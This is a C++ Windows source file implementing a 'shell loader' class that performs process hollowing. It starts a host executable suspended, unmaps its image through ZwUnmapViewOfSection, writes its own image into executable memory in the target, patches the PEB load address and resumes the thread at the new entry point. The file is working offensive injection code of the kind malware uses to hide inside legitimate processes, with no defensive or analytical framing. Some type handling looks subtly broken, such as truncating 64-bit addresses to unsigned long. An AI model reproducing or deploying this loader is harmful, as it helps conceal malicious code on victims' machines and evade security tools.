#include "StdAfx.h"
#include "Fp_ShellLoader.h"
#include "Fp_CommonFile.h"
#include "ProcessUtil.h"
#include <winternl.h>


CFpShellLoader::CFpShellLoader(LPTSTR lpszHostPath)
	: m_lpszHostPath(NULL)
	, m_pLoadAddress(NULL)
{
	m_lpszHostPath = new TCHAR[MAX_PATH];
	wmemset(m_lpszHostPath, 0, MAX_PATH);
	wmemcpy_s(m_lpszHostPath, MAX_PATH, lpszHostPath, wcslen(lpszHostPath));
}


CFpShellLoader::~CFpShellLoader(void)
{
	if (NULL != m_lpszHostPath)
		delete[] m_lpszHostPath;
}

BOOL CFpShellLoader::injectProcess()
{
	BOOL bInject = FALSE;
	BOOL bTerminate = TRUE;
	PROCESS_INFORMATION pi = {0};
	__try
	{
		if (isAttached())
		{
			bInject = TRUE;
			__leave;
		}

		HMODULE hModule = GetModuleHandle(NULL); 
		if (hModule == NULL) 
			__leave; 

		PIMAGE_DOS_HEADER pDosheader = (PIMAGE_DOS_HEADER)hModule; 
		PIMAGE_NT_HEADERS pVirPeHead = (PIMAGE_NT_HEADERS)((DWORD64)hModule + pDosheader->e_lfanew); 

		DWORD64 dwImageSize = getImageSize();

		CONTEXT ThreadCxt; 
		CHILDPROCESS stChildProcess; 
		if (!createInjectProcess(&pi, &ThreadCxt, &stChildProcess))
			__leave;

		LPVOID lpVirtual = NULL;
		if(!unloadShell(pi.hProcess, stChildProcess.dwBaseAddress))
			__leave;

		lpVirtual = VirtualAllocEx(pi.hProcess, (LPVOID)hModule, dwImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (NULL == lpVirtual)
			__leave;

		SIZE_T dwWrite;
		BOOL bRet = WriteProcessMemory(pi.hProcess, m_pLoadAddress, &lpVirtual, sizeof(DWORD64), &dwWrite); // 重写装载地址 
		if (!WriteProcessMemory(pi.hProcess, lpVirtual, hModule, dwImageSize, &dwWrite)) // 写入自己进程的代码到目标进程 
			__leave;

		printf("image inject into process success.\r\n"); 

		ThreadCxt.ContextFlags = CONTEXT_FULL; 
		//myprint(L"rcx", (int)ThreadCxt.Rcx);
		//myprint(L"rdx", (int)ThreadCxt.Rdx);
		//myprint(L"rsp", (int)ThreadCxt.Rsp);
		//myprint(L"rip", (int)ThreadCxt.Rip);
		if ((DWORD64)lpVirtual == stChildProcess.dwBaseAddress) 
			ThreadCxt.Rcx = (DWORD64)pVirPeHead->OptionalHeader.ImageBase + pVirPeHead->OptionalHeader.AddressOfEntryPoint; 
		else 
			ThreadCxt.Rcx = (DWORD64)lpVirtual + pVirPeHead->OptionalHeader.AddressOfEntryPoint; 

		//myprint(L"rcx", (int)ThreadCxt.Rcx);
		//myprint(L"rdx", (int)ThreadCxt.Rdx);
		//myprint(L"rsp", (int)ThreadCxt.Rsp);
		//myprint(L"rip", (int)ThreadCxt.Rip);

//#ifdef _DEBUG 
//		printf("EAX = [0x%08x]\r\n",ThreadCxt.Rax); 
//		printf("EBX = [0x%08x]\r\n",ThreadCxt.Rbx); 
//		printf("ECX = [0x%08x]\r\n",ThreadCxt.Rcx); 
//		printf("EDX = [0x%08x]\r\n",ThreadCxt.Rdx); 
//		printf("EIP = [0x%08x]\r\n",ThreadCxt.Rip); 
//#endif 
		if (0 == SetThreadContext(pi.hThread, &ThreadCxt))
			__leave;

		if (-1 == ResumeThread(pi.hThread))
			__leave;

		bTerminate = FALSE;
	}
	__finally
	{
		if (bTerminate)
		{
			//MessageBox(NULL, L"fail", L"tip", NULL);
			if (NULL != pi.hProcess)
				TerminateProcess(pi.hProcess, 0); 
		}
	}
	return bInject;
}

bool CFpShellLoader::isAttached()
{
	TCHAR szModulePath[MAX_PATH] = {0}; 
	GetModuleFileName( NULL, szModulePath, MAX_PATH ); 
	if (lstrcmpiW(m_lpszHostPath, szModulePath) == 0)
		return true; 
	else
		return false;
}

DWORD CFpShellLoader::getSelfImageSize( HMODULE hModule )
{
	DWORD dwImageSize = 0; 
	//__asm 
	//{ 
	//	mov rcx,0x30 
	//	mov rax, fs:[rcx] 
	//	mov rax, [rax + 0x0c] 
	//	mov rsi, [rax + 0x0c] 
	//	add rsi,0x20 
	//	lodsd 
	//	mov dwImageSize,rax 
	//} 
	return dwImageSize; 
}

// 卸载需要注入进程中的代码 
BOOL CFpShellLoader::unloadShell( HANDLE ProcHnd, unsigned long BaseAddr )
{
	typedef unsigned long (__stdcall *pfZwUnmapViewOfSection)(unsigned long, unsigned long);   
	pfZwUnmapViewOfSection ZwUnmapViewOfSection = NULL; 

	BOOL res = FALSE;   
	HMODULE m = LoadLibrary(L"ntdll.dll");   
	if(m)
	{   
		ZwUnmapViewOfSection = (pfZwUnmapViewOfSection)GetProcAddress(m, "ZwUnmapViewOfSection");   
		if(ZwUnmapViewOfSection)   
			res = (ZwUnmapViewOfSection((unsigned long)ProcHnd, BaseAddr) == 0);   
		FreeLibrary(m);   
	}   
	return res; 
} 

BOOL CFpShellLoader::createInjectProcess( PPROCESS_INFORMATION pi, PCONTEXT pThreadCxt, CHILDPROCESS *pChildProcess )
{
	STARTUPINFO si = {0};
	si.cb = sizeof(STARTUPINFO);
	if( CreateProcess(NULL, m_lpszHostPath, NULL, NULL, 0, CREATE_SUSPENDED, NULL, NULL, &si, pi )) 
	{ 
		pThreadCxt->ContextFlags = CONTEXT_ALL; 
		GetThreadContext(pi->hThread, pThreadCxt); 

		LPVOID pLoadAddress = getLoadAddress(pi->hProcess, pi->dwProcessId);
		m_pLoadAddress = pLoadAddress;
		SIZE_T read; 
		return ReadProcessMemory(pi->hProcess, m_pLoadAddress, (LPVOID)&(pChildProcess->dwBaseAddress), sizeof(DWORD64), &read); 
	} 
	return FALSE; 
}


LPVOID CFpShellLoader::getLoadAddress()
{
	HMODULE hModule = NULL;
	LPVOID pLoadAddress = NULL;
	__try
	{
		typedef NTSTATUS (WINAPI *NtQueryInformationProcessPtr)(HANDLE processHandle, PROCESSINFOCLASS processInformationClass,
			PVOID processInformation, ULONG processInformationLength, PULONG returnLength);
		hModule = LoadLibrary(L"Ntdll.dll");
		if (NULL == hModule)
			__leave;

		PROCESS_BASIC_INFORMATION pbi = {0};
		NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, "NtQueryInformationProcess");
		LONG status = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

		DWORD64 *PPEB = (DWORD64 *)pbi.PebBaseAddress; 
		DWORD64 *p = &PPEB[2];
		pLoadAddress = (LPVOID)p;
	}
	__finally
	{
		if (NULL != hModule)
			FreeLibrary(hModule);
	}
	return pLoadAddress;
}

LPVOID CFpShellLoader::getLoadAddress( HANDLE hProc, DWORD dwProcId )
{
	HMODULE hModule = NULL;
	LPVOID pLoadAddress = NULL;
	__try
	{
		//HANDLE hProcessNew = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, 0, dwProcId);

		typedef NTSTATUS (WINAPI *NtQueryInformationProcessPtr)(HANDLE processHandle, PROCESSINFOCLASS processInformationClass,
			PVOID processInformation, ULONG processInformationLength, PULONG returnLength);
		hModule = LoadLibrary(L"Ntdll.dll");
		if (NULL == hModule)
			__leave;

		PROCESS_BASIC_INFORMATION pbi = {0};
		NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, "NtQueryInformationProcess");
		LONG status = NtQueryInformationProcess(hProc, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);
		//LONG status = NtQueryInformationProcess(hProcessNew, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL);

		DWORD64 *PPEB = (DWORD64 *)pbi.PebBaseAddress; 
		DWORD64 *p = &PPEB[2];
		pLoadAddress = (LPVOID)p;

		//if (NULL != hProcessNew)
		//	CloseHandle(hProcessNew);
	}
	__finally
	{
		if (NULL != hModule)
			FreeLibrary(hModule);
	}
	return pLoadAddress;
}
